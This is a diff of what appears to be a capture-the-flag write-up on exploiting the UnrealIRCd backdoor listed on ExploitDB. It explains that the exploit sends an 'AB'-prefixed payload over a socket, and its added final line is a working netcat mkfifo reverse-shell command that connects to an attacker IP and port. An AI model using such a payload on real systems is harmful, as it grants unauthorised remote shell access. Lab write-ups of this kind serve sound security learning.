@@ -75,9 +75,19 @@
 // Lets search for exploit for UnrealIRCd service on [ExploitDB](https://www.exploit-db.com)
 
 // We see that this service vulnerable to remote code execution
-
+the
 ![Image 3]()
 
-// We can see there is a Metasploit module for exploit this service, lets try this 
+// Checking the [exploit](https://www.exploit-db.com/exploits/13853) we can see that all he does its to open a socket to connect with,
 
-https://www.exploit-db.com/exploits/13853
+// and run payload with 'AB' at the start
+
+![Image 4]()
+
+// Now can make our own payload, i used [Revshells](https://www.revshells.com/) help(recipe: nc reverse mkfifo)
+
+![Image 5]()
+
+// Lets try this 
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.232 1444 >/tmp/f
